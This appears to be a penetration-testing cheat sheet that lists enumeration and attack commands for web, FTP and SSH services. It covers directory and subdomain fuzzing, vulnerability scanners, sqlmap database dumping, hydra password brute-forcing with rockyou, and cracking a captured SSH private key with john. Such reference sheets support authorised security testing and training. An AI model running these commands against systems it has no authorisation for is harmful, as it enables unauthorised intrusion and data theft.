Web enumeration / HTTP(S) — TCP 80/443/8080/8443
++++++++++++++++++++++++++++++++++++++++
# Fingerprint first.
whatweb http://<ip_address>
curl -sI http://<ip_address>            # headers
curl -s http://<ip_address>/robots.txt

# Directory / file brute force.
feroxbuster -u http://<ip_address> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html
ffuf -u http://<ip_address>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic
gobuster dir -u http://<ip_address> -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,html

# vhost / subdomain fuzzing (filter by response size with -fs once you see the baseline).
ffuf -u http://<ip_address> -H "Host: FUZZ.<domain>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs <baseline-size>
gobuster vhost -u http://<domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain

# Scanners.
nikto -h http://<ip_address>
nuclei -u http://<ip_address>
wpscan --url http://<ip_address> --enumerate u,vp,vt   # WordPress

# SQLi: capture a request to req.txt (Burp), then:
sqlmap -r req.txt --batch --dbs
sqlmap -u "http://<ip_address>/page.php?id=1" --batch --dump
////////////////////////////////////////


FTP — TCP 21
++++++++++++++++++++++++++++++++++++++++
nmap -p21 -sCV --script=ftp-anon,ftp-bounce,ftp-syst <ip_address>
ftp <ip_address>            # try anonymous / anonymous
# mirror an open server:
wget -m --no-passive ftp://anonymous:anonymous@<ip_address>
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://<ip_address>
////////////////////////////////////////


SSH — TCP 22
++++++++++++++++++++++++++++++++++++++++
nmap -p22 -sCV <ip_address>
ssh-audit <ip_address>
ssh <user>@<ip_address>
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<ip_address>
# Found a private key? Lock down perms first or ssh refuses it:
chmod 600 id_rsa && ssh -i id_rsa <user>@<ip_address>
ssh2john id_rsa > id_rsa.hash && john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
